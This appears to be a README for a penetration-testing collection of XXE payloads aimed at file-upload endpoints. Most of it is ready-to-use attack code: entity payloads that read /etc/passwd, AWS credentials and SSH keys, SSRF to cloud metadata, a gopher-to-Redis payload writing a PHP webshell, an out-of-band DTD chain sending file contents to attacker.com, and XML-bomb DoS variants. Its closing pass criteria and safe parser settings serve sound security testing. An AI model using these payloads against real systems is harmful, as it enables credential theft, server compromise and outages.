# XXE Payloads

Payloads for testing **XML External Entity injection via file upload**. These test whether an application parses uploaded XML (or XML-based formats) with external entity resolution enabled, allowing arbitrary file reads, SSRF, and OOB data exfiltration.

---

## Attack Surface

XXE occurs when an XML parser processes a DTD with external entity declarations and the application has not disabled external entity resolution. Affected upload targets include:

- Raw `.xml`, `.svg`, `.xsl`, `.rss`, `.xhtml` uploads parsed server-side
- SAML assertions and SOAP envelopes submitted as XML
- Office documents (`.docx`, `.xlsx`, `.odt`) whose inner XML is parsed by document processing libraries
- Android `AndroidManifest.xml` parsed by mobile app analysis tools
- XInclude-capable parsers (no DTD required)
- XSLT processors that allow the `document()` function

---

## Payload Index

### Classic File Read

| File | Target Path | Notes |
|---|---|---|
| `xxe_classic.xml` | `file:///etc/passwd` | Baseline — confirms entity resolution and file read |
| `xxe_aws_creds.xml` | `file:///root/.aws/credentials` | AWS access key / secret exfiltration |
| `xxe_ssh_key.xml` | `file:///root/.ssh/id_rsa` | SSH private key exfiltration |
| `xxe_proc_environ.xml` | `file:///proc/self/environ` | Process environment variables — leaks secrets, paths, and credentials passed via env |
| `xxe_windows.xml` | `file:///c:/windows/win.ini` | Windows baseline — confirms file read on Windows servers |

All use the standard inline DTD pattern:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

---

### SSRF via External Entity

| File | Protocol / Target | Notes |
|---|---|---|
| `xxe_ssrf_http.xml` | `http://169.254.169.254/latest/meta-data/` | AWS IMDSv1 — leaks IAM role credentials |
| `xxe_ssrf_internal.xml` | `http://internal.corp/api/secret` | Generic internal HTTP target — replace with real internal host |
| `xxe_netdoc.xml` | `netdoc:///etc/passwd` | Java-specific scheme — handled by `java.net.URL`; bypasses filters blocking `file://` |
| `xxe_gopher.xml` | `gopher://internal-redis:6379/...` | Gopher protocol to Redis — sends a `SET` command writing a PHP webshell; effective against Redis instances without auth |

**`xxe_gopher.xml` payload:**
```
gopher://internal-redis:6379/_%0d%0aSET%20shell%20"<?php system($_GET[cmd]);?>"
```
Requires the XML parser's HTTP client to support the `gopher://` scheme (Java's `java.net.URL` does; most others do not).

---

### Blind / Out-of-Band Exfiltration

Use these when the parser resolves entities but the response body does not reflect the entity value.

#### `xxe_blind_oob.xml` — HTTP Ping

```xml
<!ENTITY xxe SYSTEM "http://attacker.com/xxe-ping">
```

Confirms that the parser makes outbound HTTP requests. A DNS or HTTP callback confirms parsing without requiring response reflection.

#### `xxe_blind_extdtd.xml` — External DTD Load

```xml
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
```

Loads `evil.dtd` from the attacker's server. The DTD can define additional entities, including the full exfiltration chain below.

#### `xxe_evil.dtd` — Exfiltration DTD

Host this file at `http://attacker.com/evil.dtd`. It implements the classic blind XXE file-read-and-exfil chain:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%wrap;
%send;
```

**Chain breakdown:**

| Step | What happens |
|---|---|
| `%file` | Reads `/etc/passwd` into a parameter entity |
| `%wrap` | Defines a new parameter entity `%send` whose value embeds `%file` in an HTTP URL. `&#x25;` is a hex reference for `%` — required because literal `%` cannot appear in an entity value string |
| `%send` | Fires the HTTP request to `http://attacker.com/?data=<file contents>` |

#### `xxe_parameter_entity.xml` — Inline Parameter Entity Chain

Inline version of the same chain (no external DTD required, but many parsers restrict parameter entities in internal subsets):

```xml
<!ENTITY % a SYSTEM "file:///etc/passwd">
<!ENTITY % b "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%a;'>">
%b;
...
<data>&exfil;</data>
```

---

### XInclude (No DTD Required)

XInclude is processed by the XML parser itself before any application logic runs. It does not require a `DOCTYPE` declaration and bypasses XXE mitigations that only disable external DTD resolution.

| File | Href | Notes |
|---|---|---|
| `xxe_xinclude.xml` | `file:///etc/passwd` | `parse="text"` reads the file as plain text and inlines it |
| `xxe_xinclude_ssrf.xml` | `http://169.254.169.254/latest/meta-data/` | XInclude SSRF to AWS IMDS |

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

**Affected parsers:** libxml2 (with XInclude enabled), Xerces-J, .NET `XmlDocument` with `XmlResolver`.

---

### XSLT-Based XXE

XSLT stylesheets are XML documents processed by a transformation engine. Two distinct attack paths:

#### `xxe_xslt.xsl` — DTD Entity in Stylesheet

Standard external entity in an XSL stylesheet. The entity value appears in the transformation output.

#### `xxe_xslt_document.xsl` — `document()` Function

```xml
<xsl:copy-of select="document('file:///etc/passwd')"/>
```

Uses the XSLT `document()` function to load an external file into the transformation result. **No DTD or entity declaration required.** Blocked by `FEATURE_SECURE_PROCESSING` in Java but enabled by default in many XSLT processors.

---

### Application-Format Vectors

These test XML parsers invoked indirectly through document processing libraries.

#### `xxe_rss.xml` — RSS Feed

```xml
<rss version="2.0"><channel><title>&xxe;</title></channel></rss>
```
Tests RSS/Atom feed parsers (feedparser, SimplePie, Rome).

#### `xxe_soap.xml` — SOAP Envelope

```xml
<soapenv:Envelope ...><soapenv:Body><data>&xxe;</data></soapenv:Body></soapenv:Envelope>
```
Tests web service frameworks that parse SOAP bodies (Axis, CXF, Metro, WCF).

#### `xxe_saml.xml` — SAML AuthnRequest

```xml
<samlp:AuthnRequest ...><saml:Issuer>&xxe;</saml:Issuer></samlp:AuthnRequest>
```
Tests SAML libraries (OneLogin, Shibboleth, ADFS). SAML parsers are a historically high-impact target for XXE.

#### `xxe_android_manifest.xml` — Android Manifest

```xml
<manifest ...><application android:label="&xxe;"/></manifest>
```
Tests mobile security scanning tools and APK analysis pipelines that parse `AndroidManifest.xml`.

---

### Office Document Vectors

Office formats (DOCX, XLSX, ODT) are ZIP archives containing XML. An XXE payload is injected into the inner XML before repackaging.

| File | Injected XML file | Entity location |
|---|---|---|
| `xxe_docx.docx` | `word/document.xml` | `<w:t>&xxe;</w:t>` — document body text node |
| `xxe_xlsx.xlsx` | `xl/workbook.xml` | `<sheet name="&xxe;" .../>` — sheet name attribute |
| `xxe_odt.odt` | `content.xml` | `<office:text>&xxe;</office:text>` — document body |

Use these when the upload endpoint accepts Office documents and passes them to a parser (e.g. Apache POI, LibreOffice, python-docx, openpyxl).

---

### SVG Vectors

| File | Mechanism | Notes |
|---|---|---|
| `xxe_svg.svg` | DTD entity in `<text>` | File read via SVG processed server-side (ImageMagick, librsvg, Inkscape, Batik) |
| `xxe_svg_ssrf.svg` | DTD entity → AWS IMDS URL | SSRF to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |

---

### Encoding Bypass Variants

Some XML parsers or WAFs fail to inspect entity declarations in documents with non-UTF-8 encodings.

| File | Encoding | Notes |
|---|---|---|
| `xxe_utf16.xml` | UTF-16 LE (BOM `FF FE`) | Parser decodes UTF-16 before processing; WAFs checking for `ENTITY` in raw bytes may miss it |
| `xxe_utf7.xml` | UTF-7 (`<?xml ... encoding="UTF-7"?>`) | Accepted by some Java XML parsers; `+` encoding of `<`, `>`, `&` may bypass string-match filters |

---

### DoS Variants

| File | Technique | Notes |
|---|---|---|
| `xxe_billion_laughs.xml` | 9-level exponential entity expansion | ~1 GB in memory; see [`../DoS/xmlbomb_billion_laughs.xml`](../DoS/) for full documentation |
| `xxe_quadratic_blowup.xml` | Single large entity referenced 30 times | O(n²) growth; less explosive but harder to detect statically |

---

## Exfiltration Technique Summary

| Scenario | Technique | Files |
|---|---|---|
| Response reflects entity value | Inline `SYSTEM` entity | `xxe_classic.xml`, `xxe_aws_creds.xml`, `xxe_ssh_key.xml`, etc. |
| Response does not reflect value | OOB HTTP callback | `xxe_blind_oob.xml` |
| OOB with file contents | External DTD + parameter entity chain | `xxe_blind_extdtd.xml` → `xxe_evil.dtd` |
| DTD blocked, XInclude available | `xi:include parse="text"` | `xxe_xinclude.xml` |
| XSLT processor | `document()` function | `xxe_xslt_document.xsl` |
| Office document parser | Injected inner XML | `xxe_docx.docx`, `xxe_xlsx.xlsx`, `xxe_odt.odt` |

---

## What to Test For

| Control | Passes if… |
|---|---|
| External entity resolution disabled | Parser raises an error or silently ignores `SYSTEM` entities; no file content in response |
| External DTD fetch blocked | No outbound HTTP/DNS request to `http://attacker.com/evil.dtd` |
| XInclude disabled | `xi:include` elements are rejected or ignored |
| `document()` function disabled | XSLT transformation fails or returns empty for external `document()` calls |
| OOB requests blocked | No DNS or HTTP callback from the server to attacker-controlled infrastructure |
| Office XML not parsed for entities | Document library extracts content without evaluating DTD declarations in inner XML |
| Encoding variants covered | UTF-16 and UTF-7 documents are decoded before entity scanning |

### Safe Parser Configuration (Java example)

```java
XMLInputFactory factory = XMLInputFactory.newInstance();
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

---

## Related Sections

- [`../SSRF/`](../SSRF/) — SVG-based SSRF via image processing (complements `xxe_svg_ssrf.svg`)
- [`../DoS/`](../DoS/) — Full DoS XML bomb documentation (`xmlbomb_billion_laughs.xml`, `xmlbomb_quadratic.xml`)
- [`../Content Overwrite/`](../Content%20Overwrite/) — Follow-up if the gopher-to-Redis chain succeeds and a webshell is written
